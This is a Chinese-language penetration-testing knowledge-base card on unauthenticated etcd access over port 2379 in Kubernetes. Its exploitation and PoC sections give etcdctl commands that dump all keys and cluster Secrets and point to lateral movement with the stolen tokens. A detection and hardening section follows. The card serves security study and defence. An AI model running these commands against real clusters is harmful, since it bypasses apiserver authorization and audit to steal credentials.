---
id: cloud-k8s-k8s-etcd-unauth
title: etcd 2379 未授权直接读取集群 Secret 与状态
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-etcd-unauth
tags:
- kubernetes
- etcd
- unauthorized
- secret
- credential
- 2379
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:42:36+08:00'
  notes: 已对照原文核对；etcdctl endpoints/get /registry/secrets 命令与原文一致；原文为综述无真实回显，未本地复现
url: /docs/cloud/k8s/cloud-k8s-k8s-etcd-unauth/
draft: false
kb_aliases:
- etcd 未授权
- etcd 2379
- etcdctl 读取 Secret
- 绕过 apiserver 鉴权
---

## 一句话结论

当 etcd 的 2379 端口允许匿名访问或暴露到不可信网络时，攻击者可以用 `etcdctl` 直接读取 `/registry/` 下的所有对象，绕过 apiserver 的认证、授权与审计，拿到全集群的 Secret、SA Token 和配置。

## 原理

- etcd 是 Kubernetes 唯一真实数据源，所有 Pod、Service、Secret、RoleBinding 等对象都以 `/registry/<resource>/<namespace>/<name>` 的键存储。
- 正常部署中 apiserver 是唯一读写 etcd 的组件，etcd 只监听本地或仅对 apiserver 开放，并使用 TLS 双向认证。
- 如果 etcd 被配置为允许匿名访问、使用 HTTP、或暴露到集群网络/公网，攻击者就能直接连接 2379，完全绕过 apiserver 的 RBAC 与审计。
- Secret 在 etcd 中默认只做 base64 编码（除非启用静态加密），读取键值即可还原明文；`kubernetes.io/service-account-token` 类型直接给出 Token。
- etcd 未授权不仅能读，还能写/删除键，可能造成集群数据篡改或拒绝服务；但本卡只把读写能力作为风险说明，不展开破坏性操作。

## 触发条件

- etcd 2379 从攻击者网络可达（公网、集群 Pod 网络或相邻网段）。
- etcd 未启用客户端证书认证，或证书/密钥泄露，或允许匿名访问。
- 未启用 etcd 静态加密，或加密密钥也可得。
- 目标集群的 Secret 中存在有价值凭据。

## 利用步骤

1. 探测 2379 端口与协议（HTTP/HTTPS），尝试 `etcdctl endpoint health` 或直接 `get / --prefix --keys-only`。
2. 列出所有键，定位 `/registry/secrets/`、`/registry/serviceaccounts/`、`/registry/configmaps/`。
3. 读取目标 Secret 的键值，解析 protobuf/JSON 内容，提取 `data` 字段并 base64 解码。
4. 用拿到的数据库口令、云 API Key、SA Token 横向移动。
5. 若 etcd 使用 TLS 但证书可从节点或 Pod 获取，先收集 `ca.crt`、`client.crt`、`client.key` 再连接。

```bash
# HTTP 未授权
etcdctl --endpoints=http://<etcd-ip>:2379 get / --prefix --keys-only

# 读取所有 Secret
etcdctl --endpoints=http://<etcd-ip>:2379 get /registry/secrets/ --prefix

# TLS 客户端证书
etcdctl --endpoints=https://<etcd-ip>:2379 \
  --cacert=ca.crt --cert=client.crt --key=client.key \
  get / --prefix --keys-only
```

## PoC

```bash
# 确认可访问并列出键
etcdctl --endpoints=http://<etcd-ip>:2379 get / --prefix --keys-only | head

# 读取 kube-system 下的 Secret
etcdctl --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets/kube-system/ --prefix

# 读取单个 Secret 并提取 base64 值（输出为 protobuf，可用 strings 辅助）
etcdctl --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets/default/mysql-secret | strings
```

## 变体与关联

- HTTPS + 客户端证书：需要先获得 `ca.crt`、`client.crt`、`client.key`，常见于节点上的 kubelet 配置或备份目录。
- etcd v2/v3 API 差异：v3 使用 `etcdctl` 默认 API，v2 需 `ETCDCTL_API=2`；键路径结构类似。
- 静态加密：若启用 KMS/secretbox，etcd 中的 Secret 值是密文，直接读取无法还原；但 apiserver 内存中仍是明文，可转向 apiserver 侧。
- 关联：`[[cloud-k8s-k8s-rbac-secret-read]]` 是通过 apiserver 读 Secret 的受审计路径；本卡是绕过 apiserver 的底层路径；`[[cloud-k8s-k8s-kubelet-unauth]]` 是另一类组件未授权。

## 检测与防御

- 检测：2379 端口的外部连接；etcd 日志中的匿名/未认证请求、`get / --prefix` 等批量读取；异常客户端证书。
- 检测：etcd 数据目录或备份被访问；集群中出现无法对应到 apiserver 审计日志的 Secret 使用行为。
- 防御：etcd 只监听 127.0.0.1 或控制面内网，禁止公网/集群 Pod 网络访问；启用 TLS 双向认证，禁用匿名访问。
- 防御：启用 etcd 静态加密（KMS/secretbox），并保护加密密钥；定期轮换客户端证书。
- 加固：网络策略/防火墙限制 2379 仅 apiserver 可达；审计 etcd 访问日志；备份加密并限制访问。
